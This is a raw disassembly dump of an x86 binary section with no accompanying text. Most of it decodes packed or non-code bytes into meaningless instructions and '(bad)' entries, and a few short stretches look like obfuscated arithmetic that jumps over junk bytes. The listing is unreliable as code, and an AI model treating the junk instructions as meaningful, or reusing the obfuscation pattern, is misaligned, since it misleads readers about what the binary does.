  405193:	arpl   WORD PTR [edi+0x19df667d],sp
  405199:	pop    edx
  40519a:	test   al,0xaa
  40519c:	je     0x405142
  40519e:	inc    edi
  40519f:	ins    BYTE PTR es:[edi],dx
  4051a0:	cvtps2pi mm3,QWORD PTR [ecx+0x4fe11d8]
  4051a7:	push   0xccdc293c
  4051ac:	push   eax
  4051ad:	mov    dh,0x11
  4051af:	push   ebp
  4051b0:	push   ss
  4051b1:	xor    DWORD PTR [eax+esi*2],edx
  4051b4:	xlat   BYTE PTR ds:[ebx]
  4051b5:	push   ecx
  4051b6:	pusha  
  4051b7:	int    0x6a
  4051b9:	mov    ah,0x47
  4051bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051bc:	mov    al,ds:0x48d5f0e0
  4051c1:	sbb    ebx,edi
  4051c3:	sbb    cl,dh
  4051c5:	fwait
  4051c6:	push   ebp
  4051c7:	and    bx,bx
  4051ca:	xor    ch,BYTE PTR [edx-0x3bb7d9dd]
  4051d0:	sbb    esp,DWORD PTR ds:0x2b82af29
  4051d6:	scas   eax,DWORD PTR es:[edi]
  4051d7:	lock dec ebp
  4051d9:	das    
  4051da:	in     al,dx
  4051db:	mov    dh,0x24
  4051dd:	cld    
  4051de:	rcl    ebx,0x33
  4051e1:	xor    BYTE PTR [edi-0x478b387b],ah
  4051e7:	xchg   esi,eax
  4051e8:	iret   
  4051e9:	(bad)  
  4051ea:	xor    BYTE PTR [ebx+0x62b58f3],dh
  4051f0:	pop    ebx
  4051f1:	je     0x40517d
  4051f3:	xchg   edx,edi
  4051f5:	gs sbb al,0x6a
  4051f8:	inc    esi
  4051f9:	and    al,0xc7
  4051fb:	jb     0x40521b
  4051fd:	sbb    eax,0x7ac8360a
  405202:	aaa    
  405203:	shl    DWORD PTR [eax+0x17fb8674],cl
  405209:	push   0xffffffd8
  40520b:	xor    bl,BYTE PTR [edi+0x1d]
  40520e:	adc    BYTE PTR [esi],0x54
  405211:	repnz retf 
  405213:	ds cli 
  405215:	inc    DWORD PTR [edx-0x3e]
  405218:	cmp    bh,ah
  40521a:	das    
  40521b:	cmc    
  40521c:	push   0x7e
  40521e:	xlat   BYTE PTR ds:[ebx]
  40521f:	adc    edi,DWORD PTR [ecx]
  405221:	or     BYTE PTR [edi-0x6dcc37f4],cl
  405227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405228:	push   ss
  405229:	dec    ecx
  40522a:	aad    0xa5
  40522c:	test   BYTE PTR [esp+eax*2],cl
  40522f:	sti    
  405230:	je     0x405242
  405232:	mov    ah,0xd5
  405234:	inc    ebx
  405235:	or     ah,ch
  405237:	data16 xor al,0x76
  40523a:	imul   BYTE PTR [edi+0x6b]
  40523d:	aam    0xdf
  40523f:	data16 fsub QWORD PTR [eax]
  405242:	fbld   TBYTE PTR [eax+0x39]
  405245:	(bad)  
  405247:	push   esp
  405248:	loopne 0x40522e
  40524a:	push   ds
  40524b:	cmp    al,0x8d
  40524d:	jecxz  0x405234
  40524f:	xchg   esi,eax
  405250:	fisttp QWORD PTR [edx+ebp*2-0x3b79c80f]
  405257:	out    dx,al
  405258:	push   esp
  405259:	nop
  40525a:	mov    eax,0x2720f807
  40525f:	cmc    
  405260:	movhps xmm0,QWORD PTR [ebx-0x3bf6e80e]
  405267:	pop    es
  405268:	xchg   DWORD PTR [eax-0x53fba9aa],esp
  40526e:	or     BYTE PTR [ecx+edi*2+0x6],0xa7
  405273:	dec    ecx
  405274:	inc    edx
  405275:	mov    cr3,edi
  405278:	adc    edi,DWORD PTR [ecx-0x670a18b4]
  40527e:	mov    esi,0xf39f178b
  405283:	pop    ss
  405284:	arpl   WORD PTR [eax],di
  405286:	aaa    
  405287:	inc    edi
  405288:	mov    eax,0xad29875e
  40528d:	mov    bl,0xaf
  40528f:	mov    bl,0x10
  405291:	bound  esi,QWORD PTR fs:[ebp-0x1d234f2b]
  405298:	mov    ds:0x716cf878,eax
  40529d:	pop    ebx
  40529e:	mov    ?,WORD PTR [ebx+0x27]
  4052a1:	jne    0x405299
  4052a3:	sub    ax,WORD PTR ss:[edi-0xd]
  4052a8:	lods   eax,DWORD PTR ds:[esi]
  4052a9:	add    edi,DWORD PTR [esi-0x29]
  4052ac:	not    BYTE PTR [esi+ebx*8+0x32]
  4052b0:	cmp    eax,0xd926570b
  4052b5:	lock ror BYTE PTR [ebx],cl
  4052b8:	xor    al,0x67
  4052ba:	mov    ebp,0x6f9019ed
  4052bf:	ret    0xd912
  4052c2:	clc    
  4052c3:	cdq    
  4052c4:	mov    gs,WORD PTR ds:0xe24c432d
  4052ca:	push   ds
  4052cb:	in     al,0x3b
  4052cd:	xor    BYTE PTR [esi+0x6a],dl
  4052d0:	xor    al,0x33
  4052d2:	lock leave 
  4052d4:	mov    DWORD PTR [esi+0x47],esi
  4052d7:	add    BYTE PTR [edi+ecx*1-0x5a],dl
  4052db:	sbb    esi,DWORD PTR [ecx]
  4052dd:	push   esp
  4052de:	addr16 push esp
  4052e0:	fcom   DWORD PTR [eax-0x24b99056]
  4052e6:	popf   
  4052e7:	fld    TBYTE PTR [ecx-0x4f]
  4052ea:	scas   al,BYTE PTR es:[edi]
  4052eb:	add    esp,ebp
  4052ed:	jp     0x4052ae
  4052ef:	mov    dl,0x5d
  4052f1:	out    dx,al
  4052f2:	mov    eax,ds:0x56db64a1
  4052f7:	(bad)  
  4052f8:	cmp    DWORD PTR [edx-0x2b],ecx
  4052fb:	jge    0x405321
  4052fd:	jns    0x405285
  4052ff:	jmp    DWORD PTR [ebx-0x57]
  405302:	jbe    0x405373
  405304:	(bad)  
  405305:	arpl   WORD PTR [edx+0x34266e92],bp
  40530b:	and    esp,DWORD PTR [ecx+0x25]
  40530e:	cmp    dh,dl
  405310:	xchg   DWORD PTR [esi-0x2b0f6e7a],esi
  405316:	mov    ebp,0xb2bdc7b3
  40531b:	arpl   WORD PTR [ebx-0x112a9f4a],ax
  405321:	jno    0x4052f6
  405323:	cmp    ah,BYTE PTR [esi+edx*4-0x67]
  405327:	and    DWORD PTR [ebp+0xd],ebx
  40532a:	push   edx
  40532b:	lods   al,BYTE PTR ds:[esi]
  40532c:	jmp    0xe02e7cd9
  405331:	jne    0x405391
  405333:	gs repnz cmp BYTE PTR fs:[eax+eiz*4],dh
  405339:	mov    esi,0x2866ef84
  40533e:	popf   
  40533f:	or     DWORD PTR [eax-0x692bdb4b],ebx
  405345:	mov    edi,0x201bbee9
  40534a:	(bad)  
  40534c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40534d:	pop    esp
  40534e:	in     al,dx
  40534f:	sub    edx,DWORD PTR gs:[esp+edi*8-0x60]
  405354:	in     eax,dx
  405355:	push   eax
  405356:	jle    0x4053be
  405358:	cmp    bl,dl
  40535a:	scas   eax,DWORD PTR es:[edi]
  40535b:	push   edi
  40535c:	sub    al,0xe9
  40535e:	cld    
  40535f:	ins    BYTE PTR es:[edi],dx
  405360:	inc    edx
  405361:	cli    
  405362:	sub    esp,DWORD PTR [eax]
  405364:	pop    ss
  405365:	ret    0x1d3e
  405368:	test   DWORD PTR [ecx-0x7d04f915],edx
  40536e:	push   cs
  40536f:	push   0x90db668c
  405374:	rol    al,0x33
  405377:	adc    edi,ebx
  405379:	sub    DWORD PTR [edx+edi*8+0x36be7b91],0xffffffdb
  405381:	fisttp WORD PTR [edx]
  405383:	and    esp,edi
  405385:	push   edi
  405386:	(bad)  
  405387:	mov    ah,0x4e
  405389:	retf   0x4606
  40538c:	aas    
  40538d:	push   cs
  40538e:	pop    ds
  40538f:	into   
  405390:	jo     0x405313
  405392:	or     BYTE PTR [ebx],ch
  405394:	mov    esi,0xf7a5749a
  405399:	mov    esi,0x83170e4d
  40539e:	rcl    DWORD PTR [esi],0xf6
  4053a1:	add    al,BYTE PTR [ebx+0x29]
  4053a4:	enter  0xf6c6,0x1f
  4053a8:	mov    DWORD PTR [ebp-0x74a07f3e],edi
  4053ae:	add    eax,0x2ad16bf2
  4053b3:	xor    ecx,ebp
  4053b5:	xchg   edi,eax
  4053b6:	push   ds
  4053b7:	scas   eax,DWORD PTR es:[edi]
  4053b8:	mov    bh,0x47
  4053ba:	add    ch,cl
  4053bc:	(bad)  
  4053bd:	cmc    
  4053be:	ret    0xc870
  4053c1:	adc    esp,ebx
  4053c3:	fist   DWORD PTR [ebx+0xc]
  4053c6:	mov    eax,ds:0x9a1bec84
  4053cb:	test   BYTE PTR [ebp+ebx*2-0x33],bl
  4053cf:	push   esp
  4053d0:	jecxz  0x405369
  4053d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053d3:	outs   dx,DWORD PTR ds:[esi]
  4053d4:	sub    al,0xa8
  4053d6:	jmp    0xf574aa2
  4053db:	sbb    eax,eax
  4053dd:	or     eax,0x8f9c7886
  4053e2:	les    ecx,FWORD PTR [esi-0x7f922bf9]
  4053e8:	and    BYTE PTR cs:[edx],0x1c
  4053ec:	(bad)  
  4053ee:	jmp    0xfa44:0x1f215882
  4053f5:	xor    esp,DWORD PTR [ecx-0x76]
  4053f8:	adc    eax,0xe8e0b5a4
  4053fd:	push   0xffffffb0
  4053ff:	add    BYTE PTR [bp+si-0x2f60],dh
  405404:	jmp    0x76e28869
  405409:	adc    edx,DWORD PTR [ecx+0x57ef2c43]
  40540f:	hlt    
  405410:	ja     0x4053ed
  405412:	aad    0x5c
  405414:	cmp    al,bl
  405416:	fdivp  st(0),st
  405418:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405419:	push   es
  40541a:	test   eax,0xb1a67aa6
  40541f:	adc    al,0xb4
  405421:	and    al,0x4d
  405423:	ss out 0xd6,al
  405426:	cwde   
  405427:	mov    ecx,ecx
  405429:	add    edi,eax
  40542b:	mov    al,ds:0xa094dcee
  405431:	xchg   edx,eax
  405432:	dec    edi
  405433:	mov    dl,0x4e
  405435:	shl    ah,1
  405437:	jbe    0x40548c
  405439:	out    0x8e,al
  40543b:	adc    BYTE PTR ds:0x3fa9c03f,bh
  405441:	lock mov al,ds:0xd3f86945
  405447:	repnz lods eax,DWORD PTR ds:[esi]
  405449:	jmp    0xd216:0x980b2310
  405450:	dec    edi
  405451:	aas    
  405452:	sbb    edi,DWORD PTR [ecx+eax*4-0x7a]
  405456:	out    0x93,eax
  405458:	leave  
  405459:	mov    ds:0x996792a4,al
  40545f:	dec    edi
  405460:	dec    eax
  405461:	aad    0xeb
  405463:	cmp    edi,edx
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi-0x6bcf0448]
  405484:	aaa    
  405485:	push   edi
  405486:	shr    BYTE PTR [ebx],1
  405488:	jle    0x405508
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x4054bf
  40548f:	push   edx
  405490:	mov    bh,BYTE PTR [esi+0x69935b4f]
  405496:	xchg   ebx,eax
  405497:	pop    ebp
  405498:	out    0x74,eax
  40549a:	enter  0xe28,0xd5
  40549e:	inc    ebp
  40549f:	repnz (bad) 
  4054a1:	aad    0x2
  4054a3:	sub    al,0xe6
  4054a5:	stos   BYTE PTR es:[edi],al
  4054a6:	push   ds
  4054a7:	or     eax,0x900542ed
  4054ac:	ss or  eax,0x6ed1b6ef
  4054b2:	imul   edx,DWORD PTR [ebp+0x6008dfbc],0x15
  4054b9:	dec    eax
  4054ba:	lods   al,BYTE PTR ds:[esi]
  4054bb:	inc    ecx
  4054bc:	mov    eax,ds:0xf80d94b6
  4054c1:	ss aaa 
  4054c3:	out    0xf5,al
  4054c5:	inc    ecx
  4054c6:	div    BYTE PTR [edi]
  4054c8:	mov    dh,0x98
  4054ca:	int    0x27
  4054cc:	cmp    ebx,edi
  4054ce:	mov    ds:0x270d98d7,al
  4054d3:	mov    ds:0xc85e15a3,al
  4054d8:	cwde   
  4054d9:	and    BYTE PTR [ebx],dl
  4054db:	mov    esp,0xbd63bef9
  4054e0:	xchg   edi,eax
  4054e1:	in     al,0xd8
  4054e3:	std    
  4054e4:	hlt    
  4054e5:	gs mov bh,0xb9
  4054e8:	inc    edi
  4054e9:	and    bh,BYTE PTR [eax-0x15]
  4054ec:	jge    0x4054b1
  4054ee:	iret   
  4054ef:	leave  
  4054f0:	(bad)  
  4054f1:	cmp    al,0xde
  4054f3:	cmp    DWORD PTR [edx],eax
  4054f5:	and    eax,0x2e1a23a1
  4054fa:	stos   BYTE PTR es:[edi],al
  4054fb:	mov    ah,0x3b
  4054fd:	mul    DWORD PTR ds:[edi+edx*4+0x130d44c3]
  405505:	mov    ecx,0x2b9287a0
  40550a:	inc    edx
  40550b:	lock sahf 
  40550d:	daa    
  40550e:	icebp  
  40550f:	js     0x4054f3
  405511:	sub    ch,BYTE PTR [ebx]
  405513:	jmp    0x81f0eb98
  405518:	xor    eax,0xafcfa60
  40551d:	fimul  DWORD PTR [edx-0x38]
  405520:	test   eax,0x20f954b0
  405525:	xor    BYTE PTR [eax-0x62c7dd5f],bh
  40552b:	xor    BYTE PTR [edx+0x38],0xe7
  40552f:	cwde   
  405530:	push   cs
  405531:	les    esi,FWORD PTR [edx+0x4f]
  405534:	or     al,0x4a
  405536:	pusha  
  405537:	mov    al,0x37
  405539:	sbb    al,0x3b
  40553b:	jecxz  0x4055b4
  40553d:	jmp    0xf6a8:0x91195cbf
  405544:	imul   esi,DWORD PTR [esi],0x3f
  405547:	dec    edx
  405548:	add    DWORD PTR [eax+0x72],ebx
  40554b:	mov    dh,BYTE PTR [ebp-0x5ac425cd]
  405551:	xchg   ax,ax
  405553:	fidivr DWORD PTR [ebx+0x29f0fe81]
  405559:	test   eax,0x56d6c4b
  40555e:	sti    
  40555f:	mov    WORD PTR [ebp-0x118454e3],gs
  405565:	add    DWORD PTR [edx-0x6f],edi
  405568:	mov    BYTE PTR [edi+eiz*4],dl
  40556b:	inc    ebp
  40556c:	daa    
  40556d:	lds    esi,FWORD PTR ds:0xe8ee1741
  405573:	(bad)  
  405574:	pop    edx
  405575:	ja     0x405519
  405577:	ret    
  405578:	call   0x64ea:0x62ecefef
  40557f:	icebp  
  405580:	inc    eax
  405581:	mov    ss,WORD PTR [eax+0x33]
  405584:	clc    
  405585:	test   eax,0xa716cd6f
  40558a:	add    DWORD PTR [eax],esp
  40558c:	add    eax,0x54fd734d
  405591:	lea    esi,[eax]
  405593:	das    
  405594:	or     eax,ebx
  405596:	xchg   ecx,eax
  405597:	addr16 shl BYTE PTR [bx+di-0x3e],1
  40559c:	inc    ebp
  40559d:	stos   BYTE PTR es:[edi],al
  40559e:	shl    BYTE PTR [edx+0x626478eb],1
  4055a4:	or     dl,BYTE PTR [ebp-0x32]
  4055a7:	mov    ebp,0xa6199267
  4055ac:	jl     0x40558f
  4055ae:	icebp  
  4055af:	imul   ecx,DWORD PTR [edi],0xffffffe6
  4055b2:	cmp    al,0x78
  4055b4:	cli    
  4055b5:	add    ecx,edi
  4055b7:	adc    bl,cl
  4055b9:	add    BYTE PTR [ecx+0x16803958],0x5f
  4055c0:	ficom  WORD PTR [edi-0x33]
  4055c3:	adc    BYTE PTR [ecx-0x399a69d1],0x49
  4055ca:	sub    DWORD PTR [edi-0x3d573def],eax
  4055d0:	in     al,dx
  4055d1:	sub    BYTE PTR [eax+0x1e],al
  4055d4:	in     eax,dx
  4055d5:	lods   al,BYTE PTR ds:[esi]
  4055d6:	scas   al,BYTE PTR es:[edi]
  4055d7:	xor    al,0x31
  4055d9:	inc    edi
  4055da:	add    DWORD PTR [edx],0xffffffea
  4055dd:	(bad)  
  4055de:	scas   eax,DWORD PTR es:[edi]
  4055df:	sbb    BYTE PTR [eax-0x201be0d7],0xb
  4055e6:	xchg   ebp,eax
  4055e7:	fnstcw WORD PTR [edi-0x5caf0eeb]
  4055ed:	sbb    al,0x9a
  4055ef:	mov    bl,0x61
  4055f1:	hlt    
  4055f2:	gs cmp esi,ebx
  4055f5:	stos   DWORD PTR es:[edi],eax
  4055f6:	(bad)  
  4055f8:	lods   eax,DWORD PTR ds:[esi]
  4055f9:	or     al,BYTE PTR [ebx+0x3181c8ca]
  4055ff:	fisubr DWORD PTR [edi]
  405601:	lods   al,BYTE PTR ds:[esi]
  405602:	xchg   ebx,eax
  405603:	js     0x405602
  405605:	jg     0x405592
  405607:	mov    ebx,0xee3e27a8
  40560c:	push   eax
  40560d:	sub    DWORD PTR ds:0xd0729152,esp
  405613:	mov    dh,0xd
  405615:	imul   esp,DWORD PTR ds:0x889b11d1,0xe30ea54d
  40561f:	outs   dx,DWORD PTR ds:[esi]
  405620:	inc    ecx
  405621:	pop    eax
  405622:	xlat   BYTE PTR ds:[ebx]
  405623:	push   0x522b76f6
  405628:	ficomp DWORD PTR [eax-0x4fa1327]
  40562e:	sbb    al,0xd7
  405630:	pop    edi
  405631:	jge    0x405631
  405633:	push   edi
  405634:	lea    eax,[ecx+0x487e55f8]
  40563a:	adc    eax,0x6c4fc379
  40563f:	retf   
  405640:	mov    ebp,DWORD PTR ds:0x8aa0cbed
  405646:	xor    ebx,esp
  405648:	sbb    dh,BYTE PTR [eax]
  40564a:	iret   
  40564b:	aam    0x6b
  40564d:	pop    esp
  40564e:	bound  eax,QWORD PTR [ebx-0x3f]
  405651:	or     ecx,eax
  405653:	push   eax
  405654:	push   ebp
  405655:	aas    
  405656:	and    BYTE PTR [edx],bh
  405658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405659:	test   DWORD PTR [ebx+edx*2-0x64b0c6ca],eax
  405660:	jne    0x40565f
  405662:	ret    
  405663:	xchg   DWORD PTR [eax+0x37],esp
  405666:	loop   0x4056c7
  405668:	cs out 0xf7,al
  40566b:	and    ah,BYTE PTR [ecx+ebx*1]
  40566e:	dec    ebx
  40566f:	inc    eax
  405670:	addr16 and eax,0x8c30718f
  405676:	out    0xae,al
  405678:	imul   esi,DWORD PTR [esi-0x7eb5132d],0xcff93f03
  405682:	outs   dx,BYTE PTR ds:[esi]
  405683:	lahf   
  405684:	push   ss
  405685:	mov    dl,0x3f
  405687:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405688:	jle    0x405662
  40568a:	xor    ecx,esi
  40568c:	in     al,dx
  40568d:	iret   
  40568e:	jbe    0x40568e
  405690:	mov    ebx,0xc6d34397
  405695:	aad    0x24
  405697:	push   ebp
  405698:	adc    eax,0xca734c04
  40569d:	inc    eax
  40569e:	xor    al,0xe2
  4056a0:	test   edi,edi
  4056a2:	cmp    DWORD PTR ds:0xf369008c,esp
  4056a8:	mov    BYTE PTR [esi-0x75],0xcb
  4056ac:	cdq    
  4056ad:	pop    esp
  4056ae:	hlt    
  4056af:	sub    eax,0x9af20120
  4056b4:	inc    edx
  4056b5:	nop
  4056b6:	es and al,0x8
  4056b9:	sti    
  4056ba:	(bad)  
  4056bb:	enter  0xe0f7,0x32
  4056bf:	or     ebx,DWORD PTR [ebx]
  4056c1:	or     ecx,DWORD PTR [edx-0x525aacd8]
  4056c7:	xchg   ecx,eax
  4056c8:	jno    0x405675
  4056ca:	xchg   esi,eax
  4056cb:	adc    edi,DWORD PTR [ebx-0x3f]
  4056ce:	int3   
  4056cf:	fst    QWORD PTR [eax-0x30fe9a41]
  4056d5:	fidiv  DWORD PTR fs:[edi+0x1]
  4056d9:	push   edx
  4056da:	push   cs
  4056db:	sbb    dl,bl
  4056dd:	sti    
  4056de:	sub    DWORD PTR [eax-0x7aec6ef0],ebp
  4056e4:	inc    edi
  4056e5:	pop    eax
  4056e6:	pop    edi
  4056e7:	loope  0x4056e8
  4056e9:	(bad)
  4056ec:	cli    
  4056ed:	cmp    ecx,DWORD PTR [edi-0xd3a46bc]
  4056f3:	pop    ebx
  4056f4:	jl     0x40571b
  4056f6:	mov    esp,0xad8b4a22
  4056fb:	mov    bh,0xbf
  4056fd:	enter  0x546c,0x76
  405701:	mov    dh,0xd3
  405703:	cli    
  405704:	xchg   edx,eax
  405705:	add    eax,0x720cc69e
  40570a:	nop
  40570b:	inc    ebx
  40570c:	fidiv  WORD PTR [eax+0x4b]
  40570f:	and    DWORD PTR [edx-0x5a],0x3d
  405713:	lds    esp,FWORD PTR [ecx-0x7b]
  405716:	outs   dx,DWORD PTR ds:[esi]
  405717:	mov    esp,0x77c2eac6
  40571c:	rcl    DWORD PTR [esi-0x24],cl
  40571f:	pop    esi
  405720:	in     al,0xdb
  405722:	xor    al,0xba
  405724:	test   DWORD PTR [esi],ebp
  405726:	pop    edi
  405727:	xchg   edi,eax
  405728:	mov    ecx,0x88360c13
  40572d:	aam    0xd0
  40572f:	cmc    
  405730:	shr    BYTE PTR [esp+ebx*8-0x7],cl
  405734:	xlat   BYTE PTR ds:[ebx]
  405735:	ins    BYTE PTR es:[edi],dx
  405736:	scas   eax,DWORD PTR es:[edi]
  405737:	jae    0x405722
  405739:	cmp    DWORD PTR [ebp+eiz*8-0x1bd1ed9d],ebx
  405740:	xchg   al,ah
  405742:	(bad)  
  405743:	cwde   
  405744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405745:	dec    ecx
  405746:	scas   al,BYTE PTR es:[edi]
  405747:	push   ebp
  405748:	(bad)  
  405749:	dec    esi
  40574a:	jmp    0xbe6f:0xfba9b35a
  405751:	xchg   BYTE PTR [ebp+0x15a9bb4c],dh
  405757:	mov    dh,0x78
  405759:	jge    0x4057b4
  40575b:	sbb    eax,DWORD PTR [edx-0x9b5c95a]
  405761:	(bad)  
  405762:	out    dx,eax
  405763:	or     eax,0xde412800
  405768:	mov    ebp,0x58fe804a
  40576d:	inc    esi
  40576e:	(bad)  
  40576f:	xor    eax,0xe0d7efe7
  405774:	xor    edx,eax
  405776:	add    edx,ecx
  405778:	imul   edx,edi
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43381b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x433723,0x433703
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x43375f
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0xe5
  4057f5:	and    DWORD PTR [eax],esi
  4057f7:	adc    edi,DWORD PTR [edx]
  4057f9:	ss jle 0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	sbb    ah,cl
  405802:	mov    ebp,0x7ffce7ab
  405807:	jmp    0x98318746
  40580c:	(bad)  
  40580d:	(bad)  
  40580e:	lods   eax,DWORD PTR ds:[esi]
  40580f:	push   cs
  405810:	cli    
  405811:	push   ecx
  405812:	pop    edx
  405813:	jae    0x4057ed
  405815:	cld    
  405816:	fstp   st(1)
  405818:	sahf   
  405819:	jmp    0x482:0xe0ec1b04
  405820:	jmp    FWORD PTR [edx+eax*1]
  405823:	imul   ebp,DWORD PTR [edx+0x3e0d79aa],0xffffffd7
  40582a:	je     0x405833
  40582c:	push   edi
  40582d:	push   edx
  40582e:	lods   eax,DWORD PTR ds:[esi]
  40582f:	xor    ecx,DWORD PTR es:[ecx]
  405832:	cmp    DWORD PTR [ebx-0x2bb14452],ebp
  405838:	mov    ch,0xb6
  40583a:	mov    al,0x7a
  40583c:	jnp    0x4057f8
  40583e:	xchg   esp,eax
  40583f:	jl     0x40583a
  405841:	mov    dl,0x57
  405843:	or     DWORD PTR [esi-0x51],0x72
  405847:	pop    eax
  405848:	mov    BYTE PTR [esp+edi*8-0x4fadf49a],cl
  40584f:	shl    BYTE PTR [ecx-0x54],1
  405852:	imul   ecx,DWORD PTR [ebx+0x24c4b6db],0x19
  405859:	add    eax,0xf9eacf91
  40585e:	add    bl,dl
  405860:	sbb    DWORD PTR [ebp-0x74],ebx
  405863:	xchg   ebx,eax
  405864:	dec    esp
  405865:	pop    edi
  405866:	ds mov bh,0xb9
  405869:	stc    
  40586a:	ins    DWORD PTR es:[edi],dx
  40586b:	out    dx,eax
  40586c:	or     esi,ebp
  40586e:	add    bh,BYTE PTR [ecx-0x113ed7b2]
  405874:	dec    esi
  405875:	xchg   ecx,eax
  405876:	add    edx,DWORD PTR [ecx+0x6fac6772]
  40587c:	sar    BYTE PTR [eax+ebx*1],1
  40587f:	push   ebx
  405880:	add    BYTE PTR [eax+0x11573a61],cl
  405886:	inc    esp
  405887:	mov    BYTE PTR [ebx+0x7a45723c],ah
  40588d:	jmp    0xf45d:0x2a50f7e0
  405894:	aas    
  405895:	ror    edi,cl
  405897:	push   edx
  405898:	retf   0xb2b1
  40589b:	lea    esp,[ecx]
  40589d:	inc    esp
  40589e:	xchg   BYTE PTR [edx+0x2b],bl
  4058a1:	enter  0x7d6a,0x1c
  4058a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058a6:	outs   dx,DWORD PTR ds:[esi]
  4058a7:	xor    al,BYTE PTR [edx+0x2a]
  4058aa:	cmp    edx,ebp
  4058ac:	(bad)  
  4058ad:	pop    edi
  4058ae:	popa   
  4058af:	lods   al,BYTE PTR ds:[esi]
  4058b0:	mov    bh,0x1a
  4058b2:	jne    0x4058c4
  4058b4:	(bad)  
  4058b5:	mov    ch,0xec
  4058b7:	test   al,0xf9
  4058b9:	cmp    DWORD PTR [eax+0x2c23c42d],ebp
  4058bf:	in     eax,0xa3
  4058c1:	mov    edi,0xaaf2c4f3
  4058c6:	mov    al,0xe3
  4058c8:	xor    DWORD PTR [esi],0xffffffe9
  4058cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4058cc:	push   ss
  4058cd:	pop    esi
  4058ce:	xor    BYTE PTR [edi-0x1ebca826],cl
  4058d4:	fucomip st,st(0)
  4058d6:	dec    ebp
  4058d7:	cmc    
  4058d8:	in     eax,0x19
  4058da:	call   0x59ed:0x4031
  4058e0:	ss xchg ecx,eax
  4058e2:	fstp   TBYTE PTR [ebx]
  4058e4:	sbb    BYTE PTR [edi],dl
  4058e6:	add    BYTE PTR [ebx-0x38a23300],cl
  4058ec:	int3   
  4058ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058ee:	lock fs stos DWORD PTR es:[edi],eax
  4058f1:	cwde   
  4058f2:	outs   dx,BYTE PTR ds:[esi]
  4058f3:	scas   eax,DWORD PTR es:[edi]
  4058f4:	xchg   DWORD PTR [eax-0x2],esi
  4058f7:	imul   eax
  4058f9:	dec    ebx
  4058fa:	fld    QWORD PTR [esi]
  4058fc:	loope  0x40589f
  4058fe:	xlat   BYTE PTR ds:[ebx]
  4058ff:	and    DWORD PTR [eax+0x6877df89],ebx
  405905:	xor    ebx,DWORD PTR [edi]
  405907:	jecxz  0x4058ea
  405909:	and    BYTE PTR [edx-0x66e146ad],0xc6
  405910:	jl     0x40592d
  405912:	cmp    DWORD PTR [esi-0x45],esi
  405915:	push   cs
  405916:	mov    bl,0xec
  405918:	mov    edi,edi
  40591a:	inc    ebp
  40591b:	mov    ebx,0xdcba6314
  405920:	popf   
  405921:	cmp    cl,cl
  405923:	push   edi
  405924:	adc    ebx,DWORD PTR [ebx-0xc]
  405927:	sbb    al,0xfa
  405929:	outs   dx,BYTE PTR ds:[esi]
  40592a:	sub    BYTE PTR [edi],ch
  40592c:	mov    ecx,0xda1101
  405931:	popa   
  405932:	xchg   edx,eax
  405933:	mov    esp,0xdb323e9a
  405938:	cs ja  0x4059a0
  40593b:	pop    esp
  40593c:	mov    al,ds:0xba0dd5b1
  405941:	in     al,0xf
  405943:	dec    edi
  405944:	cmp    DWORD PTR [eax],0x2596c2cb
  40594a:	retf   0x3366
  40594d:	mov    eax,0x3a30bf5a
  405952:	idiv   bh
  405954:	push   es
  405955:	jno    0x4058ee
  405957:	mov    ch,0x61
  405959:	adc    al,0xc3
  40595b:	mov    al,0x81
  40595d:	sub    al,0xa2
  40595f:	xchg   BYTE PTR [edi],dl
  405961:	loop   0x4059ce
  405963:	jmp    0x6a174ffb
  405968:	pop    eax
  405969:	xchg   esi,eax
  40596a:	fist   WORD PTR [eax]
  40596c:	sub    eax,0x19e1d89e
  405971:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405972:	mov    cl,BYTE PTR [esi]
  405974:	push   0xd711a3a3
  405979:	test   eax,0x7bd590b5
  40597e:	sti    
  40597f:	aaa    
  405980:	(bad)  [eax-0x3815bd84]
